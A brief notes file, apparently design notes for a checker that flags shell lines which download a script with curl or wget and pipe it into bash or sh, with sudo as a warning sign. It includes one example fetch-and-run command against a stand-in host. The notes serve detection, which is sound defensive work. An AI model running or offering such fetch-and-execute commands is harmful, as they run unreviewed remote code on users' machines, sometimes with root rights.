Notes
=====

Properties that an offender probably has:

* curl or wget at the beginning of the line
* http or https somewhere in the line
* a bash or sh at the end
* a pipe symbol between the curl/wget and the bash/sh

Properties an offender may have:

* Fancy execution `bash < <(curl https://ownmybox.me/install.sh)`
* $1 or other weird ways to get an arbitrary URL

Properties and offender gets bonus points for:

* Having a sudo in the line (!!!)
* su somewhere in the line (less likely)
